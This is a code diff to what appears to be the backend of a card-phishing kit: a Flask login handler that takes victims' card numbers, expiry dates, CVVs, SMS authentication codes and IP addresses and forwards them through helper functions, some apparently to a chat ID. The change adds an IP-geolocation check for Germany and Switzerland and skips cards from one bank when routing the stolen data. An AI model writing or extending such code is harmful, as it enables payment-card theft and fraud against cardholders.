@@ -1,6 +1,6 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
-from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1
+from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1, get_country_by_ip
 from CHAT_ID import *
 from checker import get_button_by_id
 import parserBIN
@@ -52,13 +52,15 @@ def login():
         ID = f'{session}'
 
         if str(parserBIN.Bin(card_number)).find('DEUTSCHE KREDITBANK AG') == -1:
-            if id == '10000001' or 1 == 1:
-                if authCode is not None and authCode != 'None':
-                    send_sms1(card_number, authCode, ID, ip_address)
+            if str(get_country_by_ip(ip_address)).find('Germany') != -1 or str(get_country_by_ip(ip_address)).find('Switzerland') != -1:
+                if id == '10000001':
+                    if authCode is not None and authCode != 'None':
+                        send_sms1(card_number, authCode, ID, ip_address)
+                        return '', 200  # Возвращаем пустой ответ с кодом 200
+                    send_me1(card_number, expiry_date, cvv, ID)
                     return '', 200  # Возвращаем пустой ответ с кодом 200
-                send_me1(card_number, expiry_date, cvv, ID)
-                return '', 200  # Возвращаем пустой ответ с кодом 200
-        
+            else:
+                send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
         # WE
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
